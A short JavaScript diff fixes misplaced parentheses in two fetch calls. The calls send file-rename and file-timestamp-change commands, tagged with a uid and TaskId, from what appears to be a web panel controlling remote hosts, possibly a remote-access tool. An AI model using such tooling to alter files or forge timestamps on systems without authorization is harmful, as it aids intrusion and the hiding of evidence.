@@ -397,7 +397,7 @@ class index{
                     const newName = prompt("Enter the new name:", oldName);
                     if (newName && newName !== oldName) {
                         const cmd = "CHANG_FILE_NAME^" + full_path + "^" + newName;
-                        fetch(this.server + "/`+web_route+`?op=msg&uid=" + this.uid + "&msg=" + encodeURIComponent(cmd))+"&Taskid="+TaskId;
+                        fetch(this.server + "/`+web_route+`?op=msg&uid=" + this.uid + "&msg=" + encodeURIComponent(cmd)+"&Taskid="+TaskId);
                         filenameSpan.innerText = newName;
                     }
                 });
@@ -408,7 +408,7 @@ class index{
                     const newTime = prompt("Enter the new modified time (format: YYYY-MM-DD HH:mm:ss):");
                     if (newTime) {
                         const cmd = "CHANG_FILE_TIME^" + currentName + "^" + newTime;
-                        fetch(this.server + "/`+web_route+`?op=msg&uid=" + this.uid + "&msg=" + encodeURIComponent(cmd))+"&Taskid="+TaskId;
+                        fetch(this.server + "/`+web_route+`?op=msg&uid=" + this.uid + "&msg=" + encodeURIComponent(cmd)+"&Taskid="+TaskId);
                         new_file.querySelector('.filetime').innerText = "<" + newTime + ">";
                     }
                 });
